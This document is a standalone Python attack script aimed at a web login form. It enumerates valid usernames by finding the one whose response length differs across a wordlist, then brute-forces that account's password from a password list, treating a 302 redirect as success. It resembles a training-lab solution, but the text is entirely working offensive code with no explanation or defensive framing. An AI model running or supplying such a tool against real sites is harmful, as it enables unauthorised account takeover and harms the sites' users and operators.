
import requests
from concurrent.futures import ThreadPoolExecutor

# Function to send a POST request for a given username
def send_request_username(username):
    data = {'username': username, 'password': default_password}
    response = requests.post(url, data=data)
    length = len(response.text)
    response_lengths[username] = length
    print(f"Username: {username}, Response Length: {length}")

def send_request_password(password):
    data = {'username': unique_length_username, 'password': password}
    response = requests.post(url, data=data, allow_redirects=False)
    
    # Check if the response or any of the redirection responses has a 302 status code
    if any(r.status_code == 302 for r in response.history):
        response_code = 302
    else:
        response_code = response.status_code

    print(f"Trying: Password: {password}, Response Code: {response_code}")
    return response_code

def main():
    global url, default_password, response_lengths, unique_length_username
    
    url = input("Enter the URL: ")
    default_password = input("Enter your default password: ")

    with open('usernames.txt', 'r') as file:
        usernames = file.read().splitlines()

    response_lengths = {}
    
    # Use ThreadPoolExecutor for concurrent requests to find unique username
    with ThreadPoolExecutor() as executor:
        executor.map(send_request_username, usernames)

    # Find the username with a different response length
    unique_length_username = None
    unique_lengths = [length for length in response_lengths.values() if list(response_lengths.values()).count(length) == 1]

    for username, length in response_lengths.items():
        print(f"Username: {username}, Response Length: {length}")

    if unique_lengths:
        unique_length_username = next(username for username, length in response_lengths.items() if length == unique_lengths[0])
        print(f"This is the username you are looking for: {unique_length_username}")
    else:
        print("All usernames have the same response length.")

    # Now perform password brute-force on the unique username
    with open('passwords.txt', 'r') as password_file:
        passwords = password_file.read().splitlines()

    found_password = None

    for password in passwords:
        response_code = send_request_password(password)
        if response_code == 302:
            found_password = password
            break

    if found_password:
        print(f"Correct Password for {unique_length_username}: {found_password}")
    else:
        print(f"No correct password found for {unique_length_username}")

if __name__ == "__main__":
    main()

